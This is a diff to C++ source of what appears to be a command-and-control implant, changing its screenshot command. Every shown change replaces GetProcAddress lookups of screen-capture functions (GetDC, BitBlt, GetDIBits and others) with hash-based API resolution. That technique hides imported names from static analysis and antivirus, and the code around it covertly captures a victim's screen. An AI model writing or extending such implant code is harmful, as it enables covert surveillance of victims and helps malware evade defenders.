@@ -46,25 +46,25 @@ auto declfn starburst::cmd_screenshot(
     }
 
     auto pGetSystemMetrics = reinterpret_cast<fn_GetSystemMetrics>(
-        inst.kernel32.GetProcAddress( h_user32, symbol<LPCSTR>( "GetSystemMetrics" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_user32 ), expr::hash_string( "GetSystemMetrics" ) ) );
     auto pGetDC = reinterpret_cast<fn_GetDC>(
-        inst.kernel32.GetProcAddress( h_user32, symbol<LPCSTR>( "GetDC" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_user32 ), expr::hash_string( "GetDC" ) ) );
     auto pReleaseDC = reinterpret_cast<fn_ReleaseDC>(
-        inst.kernel32.GetProcAddress( h_user32, symbol<LPCSTR>( "ReleaseDC" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_user32 ), expr::hash_string( "ReleaseDC" ) ) );
     auto pCreateCompatibleDC = reinterpret_cast<fn_CreateCompatibleDC>(
-        inst.kernel32.GetProcAddress( h_gdi32, symbol<LPCSTR>( "CreateCompatibleDC" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_gdi32 ), expr::hash_string( "CreateCompatibleDC" ) ) );
     auto pCreateCompatibleBitmap = reinterpret_cast<fn_CreateCompatibleBitmap>(
-        inst.kernel32.GetProcAddress( h_gdi32, symbol<LPCSTR>( "CreateCompatibleBitmap" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_gdi32 ), expr::hash_string( "CreateCompatibleBitmap" ) ) );
     auto pSelectObject = reinterpret_cast<fn_SelectObject>(
-        inst.kernel32.GetProcAddress( h_gdi32, symbol<LPCSTR>( "SelectObject" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_gdi32 ), expr::hash_string( "SelectObject" ) ) );
     auto pBitBlt = reinterpret_cast<fn_BitBlt>(
-        inst.kernel32.GetProcAddress( h_gdi32, symbol<LPCSTR>( "BitBlt" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_gdi32 ), expr::hash_string( "BitBlt" ) ) );
     auto pGetDIBits = reinterpret_cast<fn_GetDIBits>(
-        inst.kernel32.GetProcAddress( h_gdi32, symbol<LPCSTR>( "GetDIBits" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_gdi32 ), expr::hash_string( "GetDIBits" ) ) );
     auto pDeleteObject = reinterpret_cast<fn_DeleteObject>(
-        inst.kernel32.GetProcAddress( h_gdi32, symbol<LPCSTR>( "DeleteObject" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_gdi32 ), expr::hash_string( "DeleteObject" ) ) );
     auto pDeleteDC = reinterpret_cast<fn_DeleteDC>(
-        inst.kernel32.GetProcAddress( h_gdi32, symbol<LPCSTR>( "DeleteDC" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_gdi32 ), expr::hash_string( "DeleteDC" ) ) );
 
     if ( !pGetSystemMetrics || !pGetDC || !pReleaseDC || !pCreateCompatibleDC ||
          !pCreateCompatibleBitmap || !pSelectObject || !pBitBlt || !pGetDIBits ||
